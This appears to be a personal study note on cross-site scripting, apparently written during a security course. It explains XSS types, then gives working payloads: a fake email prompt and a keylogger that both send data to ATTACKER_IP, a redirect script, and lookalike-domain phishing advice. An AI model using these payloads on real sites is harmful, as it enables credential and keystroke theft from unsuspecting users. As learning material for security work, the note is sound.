# Untitled

Theory {
An **XSS** (**Cross-Site Scripting**) vulnerability is a type of computer security vulnerability that allows an attacker to execute malicious code on a user's web page without their knowledge or consent. This vulnerability enables the attacker to steal personal information such as usernames, passwords, and other confidential data.

In essence, an XSS attack involves injecting malicious code into a vulnerable web page, which is then executed in the browser of the user accessing that page. The malicious code can range from scripts that redirect the user to another page, to scripts that log keystrokes or form data and send it to a remote server.

There are several types of XSS vulnerabilities, including the following:

- **Reflected**: This type of XSS occurs when user-provided data is **reflected in the HTTP response** without proper validation. This allows an attacker to inject malicious code into the response, which is then executed in the user's browser.
- **Stored**: This type of XSS occurs when an attacker **is able to store malicious code** in a database or on the web server hosting a vulnerable web page. This code is executed every time the page is loaded.
- **DOM-Based**: This type of XSS occurs when malicious code **is executed in the user's browser through the DOM** (Document Object Model). This happens when JavaScript code on a web page modifies the DOM in a way that is vulnerable to malicious code injection.

XSS attacks can have serious consequences for businesses and individual users. For this reason, it is essential that web developers implement appropriate security measures to prevent XSS vulnerabilities. These measures may include input data validation, removal of dangerous HTML code, and limiting JavaScript permissions in the user's browser.
}

This vulnerability is commonly seen in web applications and allows us to inject JavaScript code or other types of languages.

For example, here we have a web portal that allows us to create entries for the web, and by testing, we see that if in the text section we enter `<script>alert("XSS")</script>`, it should display a pop-up window if the web is vulnerable.
![[Pasted image 20251226165732.png]]
![[Pasted image 20251226165742.png]]
This should be reported immediately because it is a fairly significant vulnerability.

Now let's create a script to execute on the web:
```html
<script>
	var email = prompt ("Please enter your email to view the post ","example@example.com");

	 if (email == null || email == ""){            #With this, we ensure that if the email field is empty, the message "A valid email is required to view the post" is displayed.
	  alert("A valid email is required to view the post ");
	 }else{                                                       #Here we specify where we want the data to be sent, which will be our IP.
		 fetch("http://ATTACKER_IP/" + email);
	 }
</script>
```
Now we copy this script and paste it into the post creation section, adding a title and everything to make it seem important so that the user clicks and enters their email. ![[Pasted image 20251226170847.png]]
Now we start a server on port 80 on our attacker machine so that when the user enters their credentials, they are sent to us. ![[Pasted image 20251226171056.png]]
Here, for example, we use Java and HTML code to interpret it as well. We are also asking for the password, mixing these languages to make it seem more professional. *XSS MUST BE COMBINED WITH SOCIAL ENGINEERING TO DECEIVE USERS AND MAKE IT AS UNSUSPICIOUS AS POSSIBLE.*
![[Pasted image 20251226171335.png]]
![[Pasted image 20251226171437.png]]
And we would listen as before.

**Keylogger**
Let's create a keylogger using script tags to log everything the user does on that specific web page (clicks, keystrokes).
```html
<script>
	var k ="";       #We create a variable named k that is empty, which will store what the user inputs.
	document.onkeypress = function (e){
		e = e || window.event;     #This line is for optimization to ensure it works across all browsers.
		k += e.key;
		var i = new Image();
		i.src = "http://ATTACKER_IP/" + k;
	}
</script>
```
And here we can see how it has logged the user's input. ![[Pasted image 20251226172441.png]]

Now let's try to redirect the user to another location.
```html
<script>
	window.location.href = "https://hack4u.io";
	
</script>
```
This would be useful, for example, if we imagine doing this on tinder.com. We could create a domain called tlnder.com, pretending to be the original, and steal credentials with a fake login page or similar.

Now we will perform cookie hijacking.

This is done for CSRF tokens, which are dynamic and change frequently.

1= URL of the web where we publish this code
2= The variable that will store all the HTML text
3= The URL of our server in listening mode, and we specify that the information should be sent in base64 with `btoa`.
![[Pasted image 20251226184521.png]]
Now on the web, we publish this line with our path to the malicious file. ![[Pasted image 20251226185018.png]]
![[Pasted image 20251226185036.png]]
Now we decode it in base64 and see the entire HTML.

Now we will parse ("a program or component that breaks down input data (text, code, etc.) into smaller parts and organizes them according to specific rules") the response.
1= Here with the `parser` variable, we take the response and the format 'text/html'.
2= It is the name of the variable in the code that stores the token, in this case "csrftoken" (this can change). We can see the name by pressing Control + U on the web.
3= This is in case this variable repeats; for example, now we are only interested in this result, so we put 0, but if we wanted more, we would put a different number.
![[Pasted image 20251226185352.png|941]]
We have to execute this on the web. ![[Pasted image 20251226185018.png]]
